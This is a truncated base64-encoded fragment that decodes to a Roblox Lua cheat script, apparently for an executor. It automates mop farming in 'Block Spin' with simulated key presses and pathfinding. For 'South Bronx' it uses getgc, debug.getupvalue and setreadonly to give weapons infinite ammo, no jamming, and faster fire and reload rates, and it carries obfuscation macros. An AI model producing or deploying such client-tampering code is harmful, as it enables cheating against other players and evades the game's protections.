dW1lbnRzWzNdID0gVGFyZ2V0UGFydAogICAgICAgICAgICAgICAgICAgIEFyZ3VtZW50c1s0XSA9IFRhcmdldFBhcnQuQ0ZyYW1lCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICByZXR1cm4gX1NlbmQodW5wYWNrKEFyZ3VtZW50cykpCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICBsb2NhbCBQcmVzc0tleSA9IGZ1bmN0aW9uKEtleUNvZGUsIER1cmF0aW9uKQogICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQoZmFsc2UsIEtleUNvZGUsIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KHRydWUsIEtleUNvZGUsIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdChEdXJhdGlvbikKICAgICAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRLZXlFdmVudChmYWxzZSwgS2V5Q29kZSwgZmFsc2UsIGdhbWUpCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgR2V0X1B1ZGRsZSA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIEN1cnJlbnRQdWRkbGUsIE1heERpc3RhbmNlLCBCZXN0UGF0aCA9IG5pbCwgbWF0aC5odWdlLCBuaWwKCiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoV29ya3NwYWNlLk1hcC5UaWxlcy5CdXJnZXJQbGFjZVRpbGUuQnVyZ2VyUGxhY2UuSW50ZXJpb3IuUHVkZGxlczpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJCYXNlUGFydCIpIGFuZCB2LlBhcmVudCBhbmQgKHYuTmFtZSA9PSAiU21hbGxQdWRkbGUiIG9yIHYuTmFtZSA9PSAiTGFyZ2VQdWRkbGUiKSBhbmQgdi5TaXplLlggPj0gMSBhbmQgdi5TaXplLlogPj0gMSBhbmQgKHYuUG9zaXRpb24gLSBWZWN0b3IzLm5ldygxNTAsIDI1MywgLTI1MCkpLk1hZ25pdHVkZSA+IDMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBocnAgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBocnAgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFBhdGggPSBTZXJ2aWNlcy5QYXRoZmluZGluZ1NlcnZpY2U6Q3JlYXRlUGF0aCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBZ2VudFJhZGl1cyA9IDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBZ2VudEhlaWdodCA9IDQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBZ2VudENhbkp1bXAgPSBmYWxzZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFnZW50Q2FuQ2xpbWIgPSB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICB9KQoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UG9zID0gdi5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDAsIDIsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIFBhdGg6Q29tcHV0ZUFzeW5jKGhycC5Qb3NpdGlvbiwgdGFyZ2V0UG9zKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgUGF0aC5TdGF0dXMgfj0gRW51bS5QYXRoU3RhdHVzLk5vUGF0aCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkaXN0ID0gKGhycC5Qb3NpdGlvbiAtIHYuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGlzdCA8IE1heERpc3RhbmNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDdXJyZW50UHVkZGxlID0gdgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1heERpc3RhbmNlID0gZGlzdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJlc3RQYXRoID0gUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgcmV0dXJuIEN1cnJlbnRQdWRkbGUsIEJlc3RQYXRoCiAgICAgICAgICAgIGVuZCkKCgogICAgICAgICAgICBsb2NhbCBNb3BfRmFybVRocmVhZAoKICAgICAgICAgICAgU3RhcnRfTW9wRmFybSA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIE1vcF9GYXJtVGhyZWFkID0gdGFzay5zcGF3bihMUEhfSklUX01BWChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KDEpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuQmxvY2tTcGluLkF1dG9GYXJtaW5nLkZhcm1Nb3BzIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBocnAgPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgaHVtYW5vaWQgb3IgaHVtYW5vaWQuSGVhbHRoIDw9IDAgb3Igbm90IGhycCB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHVkZGxlLCBwYXRoID0gR2V0X1B1ZGRsZSgpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgcHVkZGxlIG9yIG5vdCBwdWRkbGU6SXNEZXNjZW5kYW50T2YoZ2FtZSkgb3IgcHVkZGxlLlNpemUuWCA8IDEgb3IgcHVkZGxlLlNpemUuWiA8IDEgb3Igbm90IHBhdGggb3IgcGF0aC5TdGF0dXMgPT0gRW51bS5QYXRoU3RhdHVzLk5vUGF0aCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KHRydWUsIEVudW0uS2V5Q29kZS5MZWZ0U2hpZnQsIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB3YXlwb2ludHMgPSBwYXRoOkdldFdheXBvaW50cygpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgcHVkZGxlIG9yIG5vdCBwdWRkbGU6SXNEZXNjZW5kYW50T2YoZ2FtZSkgb3IgcHVkZGxlLlNpemUuWCA8IDEgb3IgcHVkZGxlLlNpemUuWiA8IDEgb3Igbm90IHBhdGggb3IgcGF0aC5TdGF0dXMgPT0gRW51bS5QYXRoU3RhdHVzLk5vUGF0aCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRlZmF1bHRfdGltZSA9IHB1ZGRsZS5OYW1lID09ICJTbWFsbFB1ZGRsZSIgYW5kIDUgb3IgcHVkZGxlLk5hbWUgPT0gIkxhcmdlUHVkZGxlIiBhbmQgMTAKCiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHRfdGltZSA9IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgKENvbmZpZy5CbG9ja1NwaW4uQXV0b0Zhcm1pbmcuTW9wVHlwZSA9PSAiRGVmYXVsdCIgYW5kIGRlZmF1bHRfdGltZSkgb3IKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChDb25maWcuQmxvY2tTcGluLkF1dG9GYXJtaW5nLk1vcFR5cGUgPT0gIlNpbHZlciIgYW5kIGRlZmF1bHRfdGltZSAqIDAuOCkgb3IKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChDb25maWcuQmxvY2tTcGluLkF1dG9GYXJtaW5nLk1vcFR5cGUgPT0gIkdvbGQiIGFuZCBkZWZhdWx0X3RpbWUgKiAwLjcpIG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAoQ29uZmlnLkJsb2NrU3Bpbi5BdXRvRmFybWluZy5Nb3BUeXBlID09ICJEaWFtb25kIiBhbmQgZGVmYXVsdF90aW1lICogMC42KSBvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdF90aW1lCgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaW5kZXgsIHdheXBvaW50IGluIGlwYWlycyh3YXlwb2ludHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZDpNb3ZlVG8od2F5cG9pbnQuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZC5Nb3ZlVG9GaW5pc2hlZDpXYWl0KCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgcHVkZGxlOklzRGVzY2VuZGFudE9mKGdhbWUpIG9yIHB1ZGRsZS5TaXplLlggPCAxIG9yIHB1ZGRsZS5TaXplLlogPCAxIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaW5kZXggPT0gI3dheXBvaW50cyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQoZmFsc2UsIEVudW0uS2V5Q29kZS5MZWZ0U2hpZnQsIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZXNzS2V5KEVudW0uS2V5Q29kZS5XLCAwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KGRlZmF1bHRfdGltZSArIDAuMjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICBlbmQKCgogICAgICAgICAgICBTdG9wX01vcEZhcm0gPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBub3QgTW9wX0Zhcm1UaHJlYWQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBpZiBjb3JvdXRpbmUuc3RhdHVzKE1vcF9GYXJtVGhyZWFkKSA9PSAic3VzcGVuZGVkIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFzay5jYW5jZWwoTW9wX0Zhcm1UaHJlYWQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBNb3BfRmFybVRocmVhZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgU3RvcF9Nb3BGYXJtKCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQogICAgICAgIGVuZAoKICAgICAgICBpZiBHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IiB0aGVuCiAgICAgICAgICAgIGlmIG5vdCBTb2xhcmEgdGhlbgogICAgICAgICAgICAgICAgQ3VycmVudEd1bkhlbGQgPSBuaWw7CgogICAgICAgICAgICAgICAgbG9jYWwgT2xkV2VhcG9uVmFsdWVzID0ge30KCiAgICAgICAgICAgICAgICBsb2NhbCBHZXRBbGxUb29scyA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBSZXN1bHQgPSB7fQogICAgICAgIAogICAgICAgICAgICAgICAgICAgIGZvciBfLCBWYWx1ZSBpbiBuZXh0LCB7TG9jYWxQbGF5ZXIuQmFja3BhY2ssIExvY2FsUGxheWVyLkNoYXJhY3RlciB+PSBuaWwgYW5kIExvY2FsUGxheWVyLkNoYXJhY3Rlcn0gZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdHlwZShWYWx1ZSkgPT0gInVzZXJkYXRhIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgX1ZhbHVlIGluIG5leHQsIFZhbHVlOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBfVmFsdWU6SXNBKCJUb29sIikgYW5kIF9WYWx1ZTpGaW5kRmlyc3RDaGlsZCgiU2V0dGluZyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzdWx0WyNSZXN1bHQgKyAxXSA9IF9WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgIAogICAgICAgICAgICAgICAgICAgIHJldHVybiBSZXN1bHQKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICBsb2NhbCBSZWxvYWRGdW5jdGlvbiA9IG5pbAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIGdldGdjKHRydWUpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90ICh0eXBlKFZhbHVlKSA9PSAiZnVuY3Rpb24iKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIEZ1bmN0aW9uX0luZm8gPSBkZWJ1Zy5nZXRpbmZvKFZhbHVlKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgdG9zdHJpbmcoRnVuY3Rpb25fSW5mby5uYW1lKSA9PSAiUmVsb2FkIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbG9hZEZ1bmN0aW9uID0gVmFsdWUKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIFJlZnJlc2hSZWxvYWRGdW5jdGlvbiA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIGdldGdjKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdHlwZW9mKFZhbHVlKSA9PSAnZnVuY3Rpb24nIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEZ1bmN0aW9uX0luZm8gPSBkZWJ1Zy5nZXRpbmZvKFZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvc3RyaW5nKEZ1bmN0aW9uX0luZm8ubmFtZSkgPT0gIlJlbG9hZCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlbG9hZEZ1bmN0aW9uID0gVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICBsb2NhbCBHZXRTZXR0aW5ncyA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKFdlYXBvbikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBTZXR0aW5ncyA9IHt9CgogICAgICAgICAgICAgICAgICAgIGZvciBpLHYgaW4gZGVidWcuZ2V0dXB2YWx1ZShSZWxvYWRGdW5jdGlvbiwgMykgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgaSB+PSBXZWFwb24gdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIFNldHRpbmdzID0gdgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gU2V0dGluZ3MKICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICBsb2NhbCBHZXRQZXJjZW50YWdlID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oRGVmYXVsdFZhbHVlLCBOZXdWYWx1ZSkKICAgICAgICAgICAgICAgICAgICBOZXdWYWx1ZSA9IG1hdGgubWF4KDAsIG1hdGgubWluKDEwMCwgTmV3VmFsdWUpKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBuZXdSZWNvaWwgPSBEZWZhdWx0VmFsdWUgKiAoTmV3VmFsdWUgLyAxMDApCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3UmVjb2lsCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgTW9kV2VhcG9uID0gTFBIX0pJVF9NQVgoZnVuY3Rpb24oV2VhcG9uKQogICAgICAgICAgICAgICAgICAgIGlmIHR5cGUoV2VhcG9uKSB+PSAidXNlcmRhdGEiIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBXZWFwb246SXNBKCJUb29sIikgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFdlYXBvbjpGaW5kRmlyc3RDaGlsZCgiU2V0dGluZyIpIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBNb2R1bGUgPSBHZXRTZXR0aW5ncyhXZWFwb24pCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgTW9kdWxlU2V0dGluZ3MgPSByYXdnZXQoTW9kdWxlLCAiTW9kdWxlIikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBPbGRDb25maWcgPSBPbGRXZWFwb25WYWx1ZXNbV2VhcG9uLk5hbWVdCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBTdWNjZXNzLCBFcnJvciA9IHBjYWxsKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTW9kdWxlID09IG5pbCBvciBNb2R1bGVTZXR0aW5ncyA9PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlZnJlc2hSZWxvYWRGdW5jdGlvbigpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFJlbG9hZEZ1bmN0aW9uID09IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNb2R1bGUgPSBHZXRTZXR0aW5ncyhXZWFwb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlU2V0dGluZ3MgPSByYXdnZXQoTW9kdWxlLCAiTW9kdWxlIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIE1vZHVsZVNldHRpbmdzID09IG5pbCBvciBNb2R1bGUgPT0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldHJlYWRvbmx5KE1vZHVsZSwgZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRyZWFkb25seShNb2R1bGVTZXR0aW5ncywgZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgU2V0SW5maW5pdGVBbW1vID09IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0SW5maW5pdGVBbW1vID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgU2V0SW5maW5pdGVDbGlwcyA9PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNldEluZmluaXRlQ2xpcHMgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS1bW2lmIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUFtbW8gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1vZHVsZS5NYWcgPSBDb25maWcuU291dGhfQnJvbnguX01vZGlmaWNhdGlvbnMuSW5maW5pdGVBbW1vIGFuZCBtYXRoLmh1Z2Ugb3IgT2xkQ29uZmlnLkFtbW8KICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0SW5maW5pdGVBbW1vID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUFtbW8gPT0gZmFsc2UgYW5kIFNldEluZmluaXRlQW1tbyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlLk1hZyA9IE9sZENvbmZpZy5NYXhBbW1vIC8gMgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNldEluZmluaXRlQW1tbyA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZF1dCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS1bW2lmIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUNsaXBzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNb2R1bGUuQW1tbyA9IENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUNsaXBzIGFuZCA5OTk5OTkgb3IgT2xkQ29uZmlnLk1heEFtbW8KICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0SW5maW5pdGVDbGlwcyA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmRdXQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUNsaXBzID09IGZhbHNlIGFuZCBTZXRJbmZpbml0ZUNsaXBzID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNb2R1bGUuQW1tbyA9IE9sZENvbmZpZy5NYXhBbW1vCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0SW5maW5pdGVDbGlwcyA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIE1vZHVsZVNldHRpbmdzLkxpbWl0ZWRBbW1vRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlU2V0dGluZ3MuTGltaXRlZEFtbW9FbmFibGVkID0gQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLkluZmluaXRlQW1tbyBhbmQgZmFsc2Ugb3IgT2xkQ29uZmlnLkxpbWl0ZWRBbW1vRW5hYmxlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgV2VhcG9uIH49IG5pbCBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIH49IG5pbCBhbmQgV2VhcG9uLlBhcmVudCA9PSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIE1vZHVsZSB+PSBuaWwgYW5kIE1vZHVsZVNldHRpbmdzIH49IG5pbCBhbmQgTW9kdWxlU2V0dGluZ3MuRmlyZVJhdGUgfj0gbmlsIGFuZCB0YXNrLndhaXQoLjEpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5EaXNhYmxlSmFtbWluZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYXdzZXQoTW9kdWxlLCAiSmFtIiwgZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYXdzZXQoTW9kdWxlLCAiQ2Fuc2hvb3QiLCB0cnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUFtbW8gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlLk1hZyA9IE9sZENvbmZpZy5BbW1vUGVyTWFnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1vZHVsZVNldHRpbmdzLkZpcmVSYXRlID0gQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLk1vZGlmeUZpcmVSYXRlIGFuZCBHZXRQZXJjZW50YWdlKE9sZENvbmZpZy5GaXJlUmF0ZSwgQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLkZpcmVSYXRlU3BlZWQpIG9yIE9sZENvbmZpZy5GaXJlUmF0ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBNb2R1bGVTZXR0aW5ncy5SZWxvYWRUaW1lID0gQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLk1vZGlmeVJlbG9hZFNwZWVkIGFuZCBHZXRQZXJjZW50YWdlKE9sZENvbmZpZy5SZWxvYWRUaW1lLCBDb25maWcuU291dGhfQnJvbnguX01vZGlmaWNhdGlvbnMuUmVsb2FkU3BlZWQpIG9yIE9sZENvbmZpZy5SZWxvYWRUaW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBNb2R1bGVTZXR0aW5ncy5UYWN0aWNhbFJlbG9hZFRpbWUgPSBDb25maWcuU291dGhfQnJvbnguX01vZGlmaWNhdGlvbnMuTW9kaWZ5UmVsb2FkU3BlZWQgYW5kIEdldFBlcmNlbnRhZ2UoT2xkQ29uZmlnLlRhY3RpY2FsUmVsb2FkVGltZSwgQ29uZmlnLlNvdXRoX0Jyb254Ll9Nb2RpZmljYXRpb25zLlJlbG9hZFNwZWVkKSBvciBPbGRDb25maWcuVGFjdGljYWxSZWxvYWRUaW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgI